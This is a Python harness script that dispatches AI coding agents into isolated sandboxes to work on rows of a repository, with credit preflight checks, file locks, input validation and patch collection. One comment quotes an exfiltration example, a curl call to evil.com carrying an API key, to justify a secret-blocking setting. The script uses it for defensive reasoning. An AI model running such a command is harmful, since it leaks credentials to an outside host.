#!/usr/bin/env python3
"""Minimal, parallel-safe replacement for sandbox_dispatch.py.

Design goals (see plans/simple-dispatch-design.md for the full rationale):
  - No `opencode` CLI anywhere -- agent_loop.py talks to OpenRouter directly,
    so none of opencode's session/CLI bugs (stdin hangs, --continue reading
    stale sessions, OPENCODE_MODEL not persisting, canned per-phase prompts)
    can happen here.
  - No plan/critic/split pipeline -- one model, one continuous in-process
    session per attempt. Verification result always drives the next step
    because there is exactly one place verify() is called and its return
    value is always used (the old split-phase discarded-verify bug is
    structurally impossible here).
  - Each dispatch gets a UNIQUE sandbox name and workdir
    (sd-<row>-<8 hex chars>), never sd-<row> alone -- two dispatches of the
    same row id can never collide, boot into each other's container, or
    rmtree each other's clone.
  - A real OS file lock (flock, non-blocking) per row id, not a `msb list`
    or board.yaml status check -- either of those can be stale; a lock
    cannot.
  - A credit-balance preflight before any sandbox boots -- refuses to spend
    a boot + retry budget dispatching into an account that is already out
    of money.
  - Parallel by construction: a plain ThreadPoolExecutor over independent
    rows. No shared WIP-counter file to get out of sync -- the pool size
    *is* the concurrency limit.

Usage:
  simple_dispatch.py ROW_ID [ROW_ID ...] --brief-dir plans/simple-briefs
      [--model deepseek/deepseek-v4-flash-0731] [--retry-cap 2]
      [--parallel 3] [--snapshot toylang-toolchain-v2]
"""
from __future__ import annotations

import argparse
import fcntl
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import urllib.error
import urllib.request
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from pathlib import Path

REPO = Path("/home/kantord/repos/toylang")
MSB_BIN = Path.home() / ".local/bin/msb"
LOCK_DIR = Path.home() / ".cache" / "toylang-simple-dispatch" / "locks"
RESULT_DIR = Path.home() / ".cache" / "toylang-simple-dispatch" / "results"
AGENT_LOOP = Path(__file__).parent / "agent_loop.py"
DEFAULT_MODEL = "deepseek/deepseek-v4-flash-0731"
DEFAULT_SNAPSHOT = "toylang-toolchain-v2"


ROW_ID_RE = re.compile(r"^[A-Za-z0-9_-]+$")


@dataclass
class Result:
    row_id: str
    ok: bool
    fatal: bool
    timed_out: bool
    message: str
    patch_path: Path | None


def sh(cmd: list, env=None, check=False, timeout=None) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, env=env, text=True, capture_output=True,
                           check=check, timeout=timeout)


def msb_env() -> dict:
    env = os.environ.copy()
    env["PATH"] = f"{Path.home() / '.local/bin'}:{env.get('PATH', '')}"
    auth = json.loads((Path.home() / ".local/share/opencode/auth.json").read_text())
    env["OPENROUTER_API_KEY"] = auth["openrouter"]["key"]
    return env


def check_credit_balance(api_key: str) -> tuple[bool, str]:
    """Refuses to dispatch anything into an account that's already out of
    money -- the exact failure mode that produced a day of misleading
    'zero file changes' escalations before anyone checked the balance
    directly.

    NOTE: this must be /api/v1/credits (account-level prepaid balance), not
    /api/v1/auth/key -- that endpoint's `limit` field is a per-key spending
    cap that is usually unset (null) and says nothing about whether the
    underlying account actually has money left. Confirmed live: auth/key
    reported limit=null ("unlimited") on an account that credits/ correctly
    showed was $0.17 *over* its balance."""
    req = urllib.request.Request(
        "https://openrouter.ai/api/v1/credits",
        headers={"Authorization": f"Bearer {api_key}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())["data"]
    except urllib.error.HTTPError as e:
        return False, f"credit check failed: HTTP {e.code} {e.read()[:300]}"
    except Exception as e:
        # Fail CLOSED, not open: a flaky network here must not silently let
        # dispatch proceed with an unknown balance -- that's a softer version
        # of the exact "blind redispatch into a dead account" bug this check
        # exists to prevent. Refusing on an inconclusive check is a false
        # positive at worst (retry the preflight); failing open risks the
        # real thing again.
        return False, f"credit check inconclusive ({e}), refusing rather than guessing"
    total = data.get("total_credits", 0) or 0
    used = data.get("total_usage", 0) or 0
    remaining = total - used
    if remaining <= 0:
        return False, f"OpenRouter balance exhausted: usage={used:.4f} >= credits={total:.4f}"
    return True, f"OpenRouter balance OK, remaining=${remaining:.4f}"


def acquire_lock(row_id: str):
    """A real OS-level lock, not a status flag anywhere that can go stale.
    Returns an open file handle to keep the lock held, or None if another
    dispatch of this row is already running."""
    LOCK_DIR.mkdir(parents=True, exist_ok=True)
    # "r+" so a lock held by someone else isn't truncated before we even
    # know whether flock will succeed -- their PID (the useful debug
    # content) would otherwise be wiped by our own failed attempt.
    path = LOCK_DIR / f"{row_id}.lock"
    path.touch(exist_ok=True)
    f = open(path, "r+")
    try:
        fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except BlockingIOError:
        f.close()
        return None
    f.seek(0)
    f.truncate()
    f.write(str(os.getpid()))
    f.flush()
    return f


def dispatch_one(row_id: str, brief_path: Path, model: str, retry_cap: int,
                  snapshot: str, max_tokens: int, overall_timeout: int) -> Result:
    if not ROW_ID_RE.match(row_id):
        # row_id is interpolated into a lock file path, a sandbox name, a
        # git branch name, and a shell command string below -- an
        # unvalidated value containing "/", "..", or shell metacharacters
        # is a path-traversal or command-injection vector, not just a
        # cosmetic problem.
        return Result(row_id, False, True, False,
                       f"invalid row id {row_id!r}: must match {ROW_ID_RE.pattern}", None)
    lock = acquire_lock(row_id)
    if lock is None:
        return Result(row_id, False, False, False,
                       "another dispatch of this row is already running (lock held)", None)
    try:
        return _dispatch_one_locked(row_id, brief_path, model, retry_cap, snapshot,
                                     max_tokens, overall_timeout)
    finally:
        fcntl.flock(lock, fcntl.LOCK_UN)
        lock.close()


def _dispatch_one_locked(row_id: str, brief_path: Path, model: str, retry_cap: int,
                          snapshot: str, max_tokens: int, overall_timeout: int) -> Result:
    run_id = uuid.uuid4().hex[:8]
    name = f"sd-{row_id}-{run_id}"  # unique per attempt -- never collides
    workdir = Path(tempfile.mkdtemp(prefix=f"simple-dispatch-{row_id}-"))
    env = msb_env()
    log_path = RESULT_DIR / f"{row_id}-{run_id}.log"
    RESULT_DIR.mkdir(parents=True, exist_ok=True)
    log = open(log_path, "w")

    def logline(s: str):
        print(s, file=log, flush=True)
        print(f"[{row_id}] {s}", file=sys.stderr)

    try:
        clone_dir = workdir / "repo"
        # Explicit timeouts on every git call, matching the msb calls below --
        # without one, a network stall here hangs the worker thread (and the
        # row's flock) indefinitely with no recovery path.
        sh(["git", "clone", "--no-hardlinks", "--quiet", str(REPO), str(clone_dir)], env=env, timeout=60)
        sh(["git", "-C", str(clone_dir), "fetch", "origin", "-q"], env=env, timeout=60)
        sh(["git", "-C", str(clone_dir), "checkout", "--quiet", "-b", f"issue-{row_id}", "origin/main"], env=env, timeout=60)
        base_commit = sh(["git", "-C", str(clone_dir), "rev-parse", "HEAD"], env=env, timeout=30).stdout.strip()
        logline(f"cloned at {base_commit}")

        args = [str(MSB_BIN), "run", "-m", "16G", "-c", "4", "--no-tty", "-d",
                 "--name", name, "--secret", "OPENROUTER_API_KEY@openrouter.ai",
                 # `--secret` only scopes the key to openrouter.ai; without an
                 # explicit --on-secret-violation, `msb run --help` documents
                 # no default action, so a model-run `curl evil.com?k=$KEY`
                 # could leak the live key on whatever the undocumented
                 # default turns out to be. Fail closed, not on faith.
                 "--on-secret-violation", "block-and-terminate",
                 "--from-snapshot", snapshot, "--", "sh", "-c", "sleep infinity"]
        r = sh(args, env=env, timeout=120)
        if r.returncode != 0:
            logline(f"boot failed: {r.stderr}")
            return Result(row_id, False, True, False, f"sandbox boot failed: {r.stderr[:500]}", None)

        def exec_in(script: str, timeout=None):
            return sh([str(MSB_BIN), "exec", name, "--", "sh", "-c", script], env=env, timeout=timeout)

        exec_in("rm -rf /repo")
        sh([str(MSB_BIN), "copy", str(clone_dir), f"{name}:/repo"], env=env)
        sh([str(MSB_BIN), "copy", str(AGENT_LOOP), f"{name}:/root/agent_loop.py"], env=env)
        sh([str(MSB_BIN), "copy", str(brief_path), f"{name}:/root/task.txt"], env=env)
        exec_in("cd /repo && git config user.name 'Daniel Kantor' && "
                "git config user.email 'git@daniel-kantor.com'")
        # The host-side clone is fully copied into the guest now -- drop it
        # immediately rather than after the whole attempt finishes. Each
        # dispatch clones the full repo; leaving these around is exactly the
        # "disk fills from worktree target dirs" incident class from the old
        # harness, just with a different directory name.
        shutil.rmtree(clone_dir, ignore_errors=True)

        # `overall_timeout` has to fit (retry_cap + 1) full verify passes
        # (each up to agent_loop.py's own 1800s verify() ceiling) PLUS every
        # turn's LLM round-trip time -- a single verify() call alone can
        # already approach 1800s on a cold-cache Rust/LLVM build, so a tight
        # outer timeout here can SIGTERM a run that was one command from
        # green, silently making the retry-cap unreachable. Default sized for
        # 2 verify passes plus real turn time with real slack, not just
        # rounded up from one verify call.
        #
        # agent_loop.py gets its OWN, smaller wall-clock budget and checks it
        # before every turn, so it can stop cleanly and print OUT_OF_TIME
        # instead of being SIGKILLed here with no VERIFIED_GREEN/VERIFY_FAILED
        # marker ever printed -- that would be indistinguishable from a plain,
        # unexplained RED. Leave room for one more verify() call (<=1800s)
        # plus overhead past agent_loop.py's own deadline.
        wall_clock_budget = max(60, overall_timeout - 1800 - 200)
        # Every value below is either from argparse (still attacker/misconfig
        # -controlled, no `choices=` constrains them) or, for row_id, already
        # validated against ROW_ID_RE above -- shlex.quote() everything
        # anyway rather than trust upstream validation to stay in sync with
        # every interpolation site.
        run_cmd = (
            f"cd /repo && export PATH=$HOME/.cargo/bin:/usr/lib/llvm-22/bin:$PATH && "
            f"export CARGO_BUILD_JOBS=2 && "
            f"timeout {overall_timeout} python3 /root/agent_loop.py "
            f"--task-file /root/task.txt --model {shlex.quote(model)} "
            f"--retry-cap {int(retry_cap)} --max-tokens {int(max_tokens)} "
            f"--wall-clock-budget {wall_clock_budget} "
            f"> /root/agent.log 2>&1; "
            f"echo RC=$? >> /root/agent.log"
        )
        logline("running agent_loop.py")
        exec_in(run_cmd, timeout=overall_timeout + 120)
        tail = exec_in("tail -c 8000 /root/agent.log").stdout
        logline(tail[-3000:])

        ok = "VERIFIED_GREEN" in tail
        fatal = "FATAL:" in tail
        # RC=124/137/143 is `timeout`(1) or a SIGKILL/SIGTERM having killed
        # the process outright -- and OUT_OF_TIME is agent_loop.py's own
        # clean self-report of the same underlying cause. Either way this is
        # NOT a genuine "the model tried and failed" RED; report it as its
        # own category so an operator doesn't read a budget problem as a
        # capability problem.
        timed_out = ("OUT_OF_TIME" in tail or "RC=124" in tail
                     or "RC=137" in tail or "RC=143" in tail)

        # `git add -A`, not `-u` plus a subdirectory-only untracked-file scan
        # (the old harness's pattern, copied here initially then caught by
        # this script's own first real smoke test): `-u` only stages already
        # -tracked changes, and the old untracked-file scan filtered on
        # paths containing "/", silently skipping any new file created at
        # the repo root -- confirmed live, a `write_file("hello.txt", ...)`
        # call was never committed under the old pattern.
        exec_in("cd /repo && git add -A && "
                "git commit -q -m 'agent_loop.py output' || true")
        exec_in(f"cd /repo && rm -f /root/*.patch; "
                f"git format-patch {base_commit} -o /root/ >/root/format-patch.log 2>&1")
        patch_out = exec_in("cat /root/*.patch 2>/dev/null").stdout
        patch_path = None
        if patch_out.strip():
            # Write into RESULT_DIR, not workdir -- workdir is removed below
            # on every path (clone_dir already is; the rest of workdir was
            # otherwise a permanent per-dispatch leak, same class as the
            # already-fixed clone_dir leak).
            patch_path = RESULT_DIR / f"{row_id}-{run_id}.patch"
            patch_path.write_text(patch_out)

        return Result(row_id, ok, fatal, timed_out, tail[-1500:], patch_path)
    finally:
        sh([str(MSB_BIN), "rm", "-f", name], env=env)
        shutil.rmtree(workdir, ignore_errors=True)
        log.close()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("rows", nargs="+")
    ap.add_argument("--brief-dir", required=True, type=Path,
                     help="directory containing <row_id>.txt brief files")
    ap.add_argument("--model", default=DEFAULT_MODEL)
    ap.add_argument("--retry-cap", type=int, default=2)
    ap.add_argument("--max-tokens", type=int, default=4096)
    ap.add_argument("--overall-timeout", type=int, default=5400,
                     help="seconds allowed for the whole attempt loop (all retries, all turns, "
                          "all verify passes) inside the sandbox; must comfortably exceed "
                          "(retry-cap+1) * a single verify pass, or the retry cap becomes "
                          "unreachable on real workloads")
    ap.add_argument("--parallel", type=int, default=3)
    ap.add_argument("--snapshot", default=DEFAULT_SNAPSHOT)
    args = ap.parse_args()

    env = msb_env()
    ok, msg = check_credit_balance(env["OPENROUTER_API_KEY"])
    print(f"[preflight] {msg}", file=sys.stderr)
    if not ok:
        print("[preflight] refusing to dispatch anything -- fix the account first", file=sys.stderr)
        return 2

    jobs = []
    for row in args.rows:
        brief = args.brief_dir / f"{row}.txt"
        if not brief.exists():
            print(f"skip {row}: no brief at {brief}", file=sys.stderr)
            continue
        jobs.append((row, brief))

    results: list[Result] = []
    with ThreadPoolExecutor(max_workers=args.parallel) as pool:
        futs = {
            pool.submit(dispatch_one, row, brief, args.model, args.retry_cap,
                        args.snapshot, args.max_tokens, args.overall_timeout): row
            for row, brief in jobs
        }
        for fut in as_completed(futs):
            row = futs[fut]
            try:
                results.append(fut.result())
            except Exception as e:
                # One row's unexpected crash (e.g. a subprocess timeout)
                # must not lose the summary for every other row still
                # running in the pool.
                results.append(Result(row, False, True, False, f"dispatch crashed: {e}", None))

    print("\n=== SUMMARY ===")
    for r in results:
        if r.timed_out:
            status = "TIMEOUT"
        elif r.fatal:
            status = "FATAL"
        elif r.ok:
            status = "GREEN"
        else:
            status = "RED"
        # A patch exists for FATAL/RED/TIMEOUT runs too (whatever the model
        # got done before things went wrong) -- label it explicitly so
        # nothing downstream mistakes an unverified patch for a landable one.
        patch_note = ""
        if r.patch_path:
            patch_note = f" -> {r.patch_path}" + ("" if status == "GREEN" else " (UNVERIFIED, do not land)")
        print(f"{r.row_id}: {status}{patch_note}")
    return 0 if all(r.ok for r in results) else 1


if __name__ == "__main__":
    sys.exit(main())
